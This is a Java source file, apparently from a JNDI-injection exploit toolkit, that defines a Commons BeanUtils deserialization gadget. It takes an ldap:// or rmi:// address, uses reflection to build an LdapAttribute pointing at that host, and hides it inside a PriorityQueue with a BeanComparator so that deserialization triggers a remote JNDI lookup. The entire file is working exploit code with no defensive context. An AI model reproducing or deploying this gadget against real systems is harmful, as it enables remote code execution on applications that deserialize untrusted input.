package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.utils.Reflections;
import org.apache.commons.beanutils.BeanComparator;

import javax.naming.CompositeName;
import java.lang.reflect.Constructor;
import java.util.PriorityQueue;

public class commonsbeanutils3 implements ObjectPayload<Object> {

    @Override
    public Object getObject(PayloadType type, String... param) throws Exception {
        if (param[0].toLowerCase().startsWith("jndi:")) {
            param[0] = param[0].substring(5);
        }

        if (!param[0].toLowerCase().startsWith("ldap://") && !param[0].toLowerCase().startsWith("rmi://")) {
            throw new Exception("Command format is: [rmi|ldap]://host:port/obj");
        }

        int    index = param[0].indexOf("/", 7);
        String host  = param[0].substring(0, index);
        String path  = param[0].substring(index + 1);

        String query = path.replace("/", "\\");

        Class       ldapAttributeClazz            = Class.forName("com.sun.jndi.ldap.LdapAttribute");
        Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(new Class[]{String.class});
        ldapAttributeClazzConstructor.setAccessible(true);
        Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(new Object[]{"name"});

        Reflections.setFieldValue(ldapAttribute, "baseCtxURL", host);
        Reflections.setFieldValue(ldapAttribute, "rdn", new CompositeName(query + "//su18"));

        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);

        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");

        Reflections.setFieldValue(comparator, "property", "attributeDefinition");
        Reflections.setFieldValue(queue, "queue", new Object[]{ldapAttribute, ldapAttribute});

        return queue;
    }
}
